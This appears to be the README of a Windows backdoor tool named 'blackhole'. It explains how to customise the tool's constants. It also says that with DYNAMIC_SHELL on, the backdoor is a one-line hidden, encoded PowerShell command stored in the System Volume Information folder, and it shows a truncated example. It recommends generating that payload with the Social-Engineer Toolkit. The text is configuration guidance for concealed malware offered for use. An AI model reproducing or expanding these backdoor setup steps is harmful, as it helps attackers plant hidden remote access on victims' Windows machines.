#blackhole: Currently supports windows only.

Quick customization:
    change consts and defines inside blackhole.hpp and main.cpp
    NOTE: If DYNAMIC_SHELL is set to be true, your backdoor should be a single line cmd command
          (e.g. powershell.exe -nop -win hidden -noni -enc JAAxACAAPQAgACcAJAB)
          which is going to be loaded from "System Volume Information~\cmd.shell".
          (Advice: Use setoolkit > Social > Powershell > Alphanumeric )
